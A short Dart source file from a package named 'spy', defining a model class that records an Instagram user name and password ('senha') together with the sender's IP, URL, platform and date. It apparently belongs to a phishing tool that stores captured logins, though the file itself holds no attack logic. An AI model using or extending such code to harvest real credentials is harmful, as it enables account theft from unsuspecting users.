import 'package:spy/src/shared/enums/platforms.dart';
import 'package:spy/src/shared/model/base_resposta_model.dart';

class RespostaInstagram extends BaseRespostaModel {
  String user;
  String senha;

  RespostaInstagram({
    String? ip,
    String? url,
    required this.user,
    required this.senha,
    required Platform platform,
    required DateTime date,
  }) : super(ip: ip, platform: platform, url: url, date: date);
}
